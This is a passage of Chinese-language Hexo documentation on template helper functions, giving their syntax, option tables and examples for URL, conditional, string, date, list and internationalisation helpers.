mail_to(&#39;a@abc.com&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;mailto:a@abc.com&quot; title&#x3D;&quot;a@abc.com&quot;&gt;a@abc.com&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- mail_to(&#39;a@abc.com&#39;, &#39;Email&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;mailto:a@abc.com&quot; title&#x3D;&quot;Email&quot;&gt;Email&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="image-tag"><a href="#image-tag" class="headerlink" title="image_tag"></a>image_tag</h3><p>插入图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- image_tag(path, [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>alt</code></td><td>图片的替代文字</td></tr><tr><td><code>class</code></td><td>Class 名称</td></tr><tr><td><code>id</code></td><td>ID</td></tr><tr><td><code>width</code></td><td>图片宽度</td></tr><tr><td><code>height</code></td><td>图片高度</td></tr></tbody></table><h3 id="favicon-tag"><a href="#favicon-tag" class="headerlink" title="favicon_tag"></a>favicon_tag</h3><p>插入 favicon。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- favicon_tag(path) %&gt;</span><br></pre></td></tr></table></figure><h3 id="feed-tag"><a href="#feed-tag" class="headerlink" title="feed_tag"></a>feed_tag</h3><p>插入 feed 链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- feed_tag(path, [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>title</code></td><td>Feed 标题</td><td></td></tr><tr><td><code>type</code></td><td>Feed 类型</td><td>atom</td></tr></tbody></table><h2 id="条件函数"><a href="#条件函数" class="headerlink" title="条件函数"></a>条件函数</h2><h3 id="is-current"><a href="#is-current" class="headerlink" title="is_current"></a>is_current</h3><p>检查 <code>path</code> 是否符合目前页面的网址。开启 <code>strict</code> 选项启用严格比对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_current(path, [strict]) %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-home"><a href="#is-home" class="headerlink" title="is_home"></a>is_home</h3><p>检查目前是否为首页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_home() %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-post"><a href="#is-post" class="headerlink" title="is_post"></a>is_post</h3><p>检查目前是否为文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_post() %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-archive"><a href="#is-archive" class="headerlink" title="is_archive"></a>is_archive</h3><p>检查目前是否为存档页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_archive() %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-year"><a href="#is-year" class="headerlink" title="is_year"></a>is_year</h3><p>检查目前是否为年度归档页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_year() %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-month"><a href="#is-month" class="headerlink" title="is_month"></a>is_month</h3><p>检查目前是否为月度归档页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_month() %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-category"><a href="#is-category" class="headerlink" title="is_category"></a>is_category</h3><p>检查目前是否为分类归档页面。<br>如果给定一个字符串作为参数，将会检查目前是否为指定分类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_category() %&gt;</span><br><span class="line">&lt;%- is_category(&#39;hobby&#39;) %&gt;</span><br></pre></td></tr></table></figure><h3 id="is-tag"><a href="#is-tag" class="headerlink" title="is_tag"></a>is_tag</h3><p>检查目前是否为标签归档页面。<br>如果给定一个字符串作为参数，将会检查目前是否为指定标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- is_tag() %&gt;</span><br><span class="line">&lt;%- is_tag(&#39;hobby&#39;) %&gt;</span><br></pre></td></tr></table></figure><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>清除字符串开头和结尾的空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- trim(string) %&gt;</span><br></pre></td></tr></table></figure><h3 id="strip-html"><a href="#strip-html" class="headerlink" title="strip_html"></a>strip_html</h3><p>清除字符串中的 HTML 标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- strip_html(string) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- strip_html(&#39;It&#39;s not &lt;b&gt;important&lt;&#x2F;b&gt; anymore!&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; It&#39;s not important anymore!</span><br></pre></td></tr></table></figure><h3 id="titlecase"><a href="#titlecase" class="headerlink" title="titlecase"></a>titlecase</h3><p>把字符串转换为正确的 Title case。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- titlecase(string) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- titlecase(&#39;this is an apple&#39;) %&gt;</span><br><span class="line"># This is an Apple</span><br></pre></td></tr></table></figure><h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><p>使用 Markdown 解析字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- markdown(str) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- markdown(&#39;make me **strong**&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; make me &lt;strong&gt;strong&lt;&#x2F;strong&gt;</span><br></pre></td></tr></table></figure><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><p>解析字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- render(str, engine, [options]) %&gt;</span><br></pre></td></tr></table></figure><h3 id="word-wrap"><a href="#word-wrap" class="headerlink" title="word_wrap"></a>word_wrap</h3><p>使每行的字符串长度不超过 <code>length</code>。<code>length</code> 预设为 80。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- word_wrap(str, [length]) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- word_wrap(&#39;Once upon a time&#39;, 8) %&gt;</span><br><span class="line">&#x2F;&#x2F; Once upon\n a time</span><br></pre></td></tr></table></figure><h3 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h3><p>移除超过 <code>length</code> 长度的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- truncate(text, length) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- truncate(&#39;Once upon a time in a world far far away&#39;, &#123;length: 17&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; Once upon a ti...</span><br><span class="line"></span><br><span class="line">&lt;%- truncate(&#39;Once upon a time in a world far far away&#39;, &#123;length: 17, separator: &#39; &#39;&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; Once upon a...</span><br><span class="line"></span><br><span class="line">&lt;%- truncate(&#39;And they found that many people were sleeping better.&#39;, &#123;length: 25, omission: &#39;... (continued)&#39;&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; And they f... (continued)</span><br></pre></td></tr></table></figure><h2 id="模板-1"><a href="#模板-1" class="headerlink" title="模板"></a>模板</h2><h3 id="partial"><a href="#partial" class="headerlink" title="partial"></a>partial</h3><p>载入其他模板文件，您可在 <code>locals</code> 设定区域变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(layout, [locals], [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>cache</code></td><td>缓存（使用 Fragment cache）</td><td><code>false</code></td></tr><tr><td><code>only</code></td><td>限制局部变量。在模板中只能使用 <code>locals</code> 中设定的变量。</td><td><code>false</code></td></tr></tbody></table><h3 id="fragment-cache"><a href="#fragment-cache" class="headerlink" title="fragment_cache"></a>fragment_cache</h3><p>局部缓存。它储存局部内容，下次使用时就能直接使用缓存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- fragment_cache(id, fn);</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- fragment_cache(&#39;header&#39;, function()&#123;</span><br><span class="line">  return &#39;&lt;header&gt;&lt;&#x2F;header&gt;&#39;;</span><br><span class="line">&#125;) %&gt;</span><br></pre></td></tr></table></figure><h2 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h2><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>插入格式化的日期。<code>date</code> 可以是 UNIX 时间、ISO 字符串、Date 对象或 <a href="http://momentjs.com/">Moment.js</a> 对象。<code>format</code> 默认为 <code>date_format</code> 配置信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- date(date, [format]) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- date(Date.now()) %&gt;</span><br><span class="line">&#x2F;&#x2F; 2013-01-01</span><br><span class="line"></span><br><span class="line">&lt;%- date(Date.now(), &#39;YYYY&#x2F;M&#x2F;D&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; Jan 1 2013</span><br></pre></td></tr></table></figure><h3 id="date-xml"><a href="#date-xml" class="headerlink" title="date_xml"></a>date_xml</h3><p>插入 XML 格式的日期。<code>date</code> 可以是 UNIX 时间、ISO 字符串、Date 对象或 <a href="http://momentjs.com/">Moment.js</a> 对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- date_xml(date) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- date_xml(Date.now()) %&gt;</span><br><span class="line">&#x2F;&#x2F; 2013-01-01T00:00:00.000Z</span><br></pre></td></tr></table></figure><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><p>插入格式化的时间。<code>date</code> 可以是 UNIX 时间、ISO 字符串、Date 对象或 <a href="http://momentjs.com/">Moment.js</a> 对象。<code>format</code> 默认为 <code>time_format</code> 配置信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- time(date, [format]) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- time(Date.now()) %&gt;</span><br><span class="line">&#x2F;&#x2F; 13:05:12</span><br><span class="line"></span><br><span class="line">&lt;%- time(Date.now(), &#39;h:mm:ss a&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 1:05:12 pm</span><br></pre></td></tr></table></figure><h3 id="full-date"><a href="#full-date" class="headerlink" title="full_date"></a>full_date</h3><p>插入格式化的日期和时间。<code>date</code> 可以是 UNIX 时间、ISO 字符串、Date 对象或 <a href="http://momentjs.com/">Moment.js</a> 对象。<code>format</code> 默认为 <code>date_format + time_format</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- full_date(date, [format]) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- full_date(new Date()) %&gt;</span><br><span class="line">&#x2F;&#x2F; Jan 1, 2013 0:00:00</span><br><span class="line"></span><br><span class="line">&lt;%- full_date(new Date(), &#39;dddd, MMMM Do YYYY, h:mm:ss a&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; Tuesday, January 1st 2013, 12:00:00 am</span><br></pre></td></tr></table></figure><h3 id="moment"><a href="#moment" class="headerlink" title="moment"></a>moment</h3><p><a href="http://momentjs.com/">Moment.js</a> 函数库。</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="list-categories"><a href="#list-categories" class="headerlink" title="list_categories"></a>list_categories</h3><p>插入分类列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- list_categories([options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>orderby</code></td><td>分类排列方式</td><td>name</td></tr><tr><td><code>order</code></td><td>分类排列顺序。<code>1</code>, <code>asc</code> 升序；<code>-1</code>, <code>desc</code> 降序。</td><td>1</td></tr><tr><td><code>show_count</code></td><td>显示每个分类的文章总数</td><td>true</td></tr><tr><td><code>style</code></td><td>分类列表的显示方式。使用 <code>list</code> 以无序列表（unordered list）方式显示。</td><td>list</td></tr><tr><td><code>separator</code></td><td>分类间的分隔符号。只有在 <code>style</code> 不是 <code>list</code> 时有用。</td><td>,</td></tr><tr><td><code>depth</code></td><td>要显示的分类层级。<code>0</code> 显示所有层级的分类；<code>-1</code> 和 <code>0</code> 很类似，但是显示不分层级；<code>1</code> 只显示第一层的分类。</td><td>0</td></tr><tr><td><code>class</code></td><td>分类列表的 class 名称。</td><td>category</td></tr><tr><td><code>transform</code></td><td>改变分类名称显示方法的函数</td><td></td></tr></tbody></table><h3 id="list-tags"><a href="#list-tags" class="headerlink" title="list_tags"></a>list_tags</h3><p>插入标签列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- list_tags([options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th><th>预设值</th></tr></thead><tbody><tr><td><code>orderby</code></td><td>标签排列方式</td><td>name</td></tr><tr><td><code>order</code></td><td>标签排列顺序。<code>1</code>, <code>asc</code> 升序；<code>-1</code>, <code>desc</code> 降序。</td><td>1</td></tr><tr><td><code>show_count</code></td><td>显示每个标签的文章总数</td><td>true</td></tr><tr><td><code>style</code></td><td>标签列表的显示方式。使用 <code>list</code> 以无序列表（unordered list）方式显示。</td><td>list</td></tr><tr><td><code>separator</code></td><td>标签间的分隔符号。只有在 <code>style</code> 不是 <code>list</code> 时有用。</td><td>,</td></tr><tr><td><code>class</code></td><td>标签列表的 class 名称。</td><td>tag</td></tr><tr><td><code>transform</code></td><td>改变标签名称显示方法的函数</td><td></td></tr><tr><td><code>amount</code></td><td>要显示的标签数量（0 = 无限制）</td><td>0</td></tr></tbody></table><h3 id="list-archives"><a href="#list-archives" class="headerlink" title="list_archives"></a>list_archives</h3><p>插入归档列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- list_archives([options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>type</code></td><td>类型。此设定可为 <code>yearly</code> 或 <code>monthly</code>。</td><td>monthly</td></tr><tr><td><code>order</code></td><td>排列顺序。<code>1</code>, <code>asc</code> 升序；<code>-1</code>, <code>desc</code> 降序。</td><td>1</td></tr><tr><td><code>show_count</code></td><td>显示每个归档的文章总数</td><td>true</td></tr><tr><td><code>format</code></td><td>日期格式</td><td>MMMM YYYY</td></tr><tr><td><code>style</code></td><td>归档列表的显示方式。使用 <code>list</code> 以无序列表（unordered list）方式显示。</td><td>list</td></tr><tr><td><code>separator</code></td><td>归档间的分隔符号。只有在 <code>style</code> 不是 <code>list</code> 时有用。</td><td>,</td></tr><tr><td><code>class</code></td><td>归档列表的 class 名称。</td><td>archive</td></tr><tr><td><code>transform</code></td><td>改变归档名称显示方法的函数</td><td></td></tr></tbody></table><h3 id="list-posts"><a href="#list-posts" class="headerlink" title="list_posts"></a>list_posts</h3><p>插入文章列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- list_posts([options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>orderby</code></td><td>文章排列方式</td><td>date</td></tr><tr><td><code>order</code></td><td>文章排列顺序。<code>1</code>, <code>asc</code> 升序；<code>-1</code>, <code>desc</code> 降序。</td><td>-1</td></tr><tr><td><code>style</code></td><td>文章列表的显示方式。使用 <code>list</code> 以无序列表（unordered list）方式显示。</td><td>list</td></tr><tr><td><code>separator</code></td><td>文章间的分隔符号。只有在 <code>style</code> 不是 <code>list</code> 时有用。</td><td>,</td></tr><tr><td><code>class</code></td><td>文章列表的 class 名称。</td><td>post</td></tr><tr><td><code>amount</code></td><td>要显示的文章数量（0 = 无限制）</td><td>6</td></tr><tr><td><code>transform</code></td><td>改变文章名称显示方法的函数</td><td></td></tr></tbody></table><h3 id="tagcloud"><a href="#tagcloud" class="headerlink" title="tagcloud"></a>tagcloud</h3><p>插入标签云。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- tagcloud([tags], [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>min_font</code></td><td>最小字体尺寸</td><td>10</td></tr><tr><td><code>max_font</code></td><td>最大字体尺寸</td><td>20</td></tr><tr><td><code>unit</code></td><td>字体尺寸的单位</td><td>px</td></tr><tr><td><code>amount</code></td><td>标签总量</td><td>40</td></tr><tr><td><code>orderby</code></td><td>标签排列方式</td><td>name</td></tr><tr><td><code>order</code></td><td>标签排列顺序。<code>1</code>, <code>sac</code> 升序；<code>-1</code>, <code>desc</code> 降序</td><td>1</td></tr><tr><td><code>color</code></td><td>使用颜色</td><td>false</td></tr><tr><td><code>start_color</code></td><td>开始的颜色。您可使用十六进位值（<code>#b700ff</code>），rgba（<code>rgba(183, 0, 255, 1)</code>），hsla（<code>hsla(283, 100%, 50%, 1)</code>）或 <a href="http://www.w3.org/TR/css3-color/#svg-color">颜色关键字</a>。此变量仅在 <code>color</code> 参数开启时才有用。</td><td></td></tr><tr><td><code>end_color</code></td><td>结束的颜色。您可使用十六进位值（<code>#b700ff</code>），rgba（<code>rgba(183, 0, 255, 1)</code>），hsla（<code>hsla(283, 100%, 50%, 1)</code>）或 <a href="http://www.w3.org/TR/css3-color/#svg-color">颜色关键字</a>。此变量仅在 <code>color</code> 参数开启时才有用。</td><td></td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="paginator"><a href="#paginator" class="headerlink" title="paginator"></a>paginator</h3><p>插入分页链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- paginator(options) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>base</code></td><td>基础网址</td><td>/</td></tr><tr><td><code>format</code></td><td>网址格式</td><td>page/%d/</td></tr><tr><td><code>total</code></td><td>分页总数</td><td>1</td></tr><tr><td><code>current</code></td><td>目前页数</td><td>0</td></tr><tr><td><code>prev_text</code></td><td>上一页链接的文字。仅在 <code>prev_next</code> 设定开启时才有用。</td><td>Prev</td></tr><tr><td><code>next_text</code></td><td>下一页链接的文字。仅在 <code>prev_next</code> 设定开启时才有用。</td><td>Next</td></tr><tr><td><code>space</code></td><td>空白文字</td><td>…</td></tr><tr><td><code>prev_next</code></td><td>显示上一页和下一页的链接</td><td>true</td></tr><tr><td><code>end_size</code></td><td>显示于两侧的页数</td><td>1</td></tr><tr><td><code>mid_size</code></td><td>显示于中间的页数</td><td>2</td></tr><tr><td><code>show_all</code></td><td>显示所有页数。如果开启此参数的话，<code>end_size</code> 和 <code>mid_size</code> 就没用了。</td><td>false</td></tr></tbody></table><h3 id="search-form"><a href="#search-form" class="headerlink" title="search_form"></a>search_form</h3><p>插入 Google 搜索框。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- search_form(options) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>class</code></td><td>表单的 class name</td><td>search-form</td></tr><tr><td><code>text</code></td><td>搜索提示文字</td><td>Search</td></tr><tr><td><code>button</code></td><td>显示搜索按钮。此参数可为布尔值（boolean）或字符串，当设定是字符串的时候，即为搜索按钮的文字。</td><td>false</td></tr></tbody></table><h3 id="number-format"><a href="#number-format" class="headerlink" title="number_format"></a>number_format</h3><p>格式化数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- number_format(number, [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>precision</code></td><td>数字精度。此选项可为 <code>false</code> 或非负整数。</td><td>false</td></tr><tr><td><code>delimiter</code></td><td>千位数分隔符号</td><td>,</td></tr><tr><td><code>separator</code></td><td>整数和小数之间的分隔符号</td><td>.</td></tr></tbody></table><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- number_format(12345.67, &#123;precision: 1&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 12,345.68</span><br><span class="line"></span><br><span class="line">&lt;%- number_format(12345.67, &#123;precision: 4&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 12,345.6700</span><br><span class="line"></span><br><span class="line">&lt;%- number_format(12345.67, &#123;precision: 0&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 12,345</span><br><span class="line"></span><br><span class="line">&lt;%- number_format(12345.67, &#123;delimiter: &#39;&#39;&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 12345.67</span><br><span class="line"></span><br><span class="line">&lt;%- number_format(12345.67, &#123;separator: &#39;&#x2F;&#39;&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; 12,345&#x2F;67</span><br></pre></td></tr></table></figure><h3 id="open-graph"><a href="#open-graph" class="headerlink" title="open_graph"></a>open_graph</h3><p>插入 open graph 资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- open_graph([options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>title</code></td><td>页面标题 (<code>og:title</code>)</td><td><code>page.title</code></td></tr><tr><td><code>type</code></td><td>页面类型 (<code>og:type</code>)</td><td>blog</td></tr><tr><td><code>url</code></td><td>页面网址 (<code>og:url</code>)</td><td><code>url</code></td></tr><tr><td><code>image</code></td><td>页面图片 (<code>og:image</code>)</td><td>内容中的图片</td></tr><tr><td><code>site_name</code></td><td>网站名称 (<code>og:site_name</code>)</td><td><code>config.title</code></td></tr><tr><td><code>description</code></td><td>页面描述 (<code>og:desription</code>)</td><td>内容摘要或前 200 字</td></tr><tr><td><code>twitter_card</code></td><td>Twitter 卡片类型 (<code>twitter:card</code>)</td><td>summary</td></tr><tr><td><code>twitter_id</code></td><td>Twitter ID (<code>twitter:creator</code>)</td><td></td></tr><tr><td><code>twitter_site</code></td><td>Twitter 网站 (<code>twitter:site</code>)</td><td></td></tr><tr><td><code>google_plus</code></td><td>Google+ 个人资料链接</td><td></td></tr><tr><td><code>fb_admins</code></td><td>Facebook 管理者 ID</td><td></td></tr><tr><td><code>fb_app_id</code></td><td>Facebook 应用程序 ID</td><td></td></tr></tbody></table><h3 id="toc"><a href="#toc" class="headerlink" title="toc"></a>toc</h3><p>解析内容中的标题标签 (h1~h6) 并插入目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- toc(str, [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>class</code></td><td>Class 名称</td><td>toc</td></tr><tr><td><code>list_number</code></td><td>显示编号</td><td>true</td></tr></tbody></table><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- toc(page.content) %&gt;</span><br></pre></td></tr></table></figure><h1 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h1><p>若要让您的网站以不同语言呈现，您可使用国际化（internationalization）功能。请先在 <code>_config.yml</code> 中调整 <code>language</code> 设定，这代表的是预设语言，您也可设定多个语言来调整预设语言的顺位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">language: zh-tw</span><br><span class="line"></span><br><span class="line">language: </span><br><span class="line">- zh-tw</span><br><span class="line">- en</span><br></pre></td></tr></table></figure><h3 id="语言文件"><a href="#语言文件" class="headerlink" title="语言文件"></a>语言文件</h3><p>语言文件可以使用 YAML 或 JSON 编写，并放在主题文件夹中的 <code>languages</code> 文件夹。您可以在语言文件中使用 <a href="https://github.com/alexei/sprintf.js">printf 格式</a>。</p><h3 id="模板-2"><a href="#模板-2" class="headerlink" title="模板"></a>模板</h3><p>在模板中，透过 <code>__</code> 或 <code>_p</code> 辅助函数，即可取得翻译后的字符串，前者用于一般使用；而后者用于复数字符串。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">en.ymlindex:</span><br><span class="line">  title: Home</span><br><span class="line">  add: Add</span><br><span class="line">  video:</span><br><span class="line">    zero: No videos</span><br><span class="line">    one: One video</span><br><span class="line">    other: %d videos</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%&#x3D; 